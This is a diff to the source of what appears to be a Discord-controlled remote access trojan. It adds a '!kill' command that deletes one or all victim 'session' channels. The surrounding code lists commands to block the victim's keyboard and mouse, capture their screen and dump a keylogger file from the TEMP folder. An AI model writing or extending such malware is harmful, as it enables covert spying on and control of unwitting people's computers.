@@ -50,6 +50,7 @@ Availaible commands are :
 --> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
 --> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
+--> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
 """
 
 async def activity(client):
@@ -134,11 +135,20 @@ async def on_message(message):
     else:
         if message.content.startswith("!kill"):
             try:
-                channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
-                await channel_to_delete.delete()
-                await message.channel.send(f"[*] {message.content[6:]} killed.")
+                if message.content[6:] == "all":
+                    for y in range(len(total)): #Probably a better way to do this
+                        if "session" in total[y]:
+                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
+                            await channel_to_delete.delete()
+                        else:
+                            pass
+                else:
+                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
+                    await channel_to_delete.delete()
+                    await message.channel.send(f"[*] {message.content[6:]} killed.")
             except:
                 await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
+
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
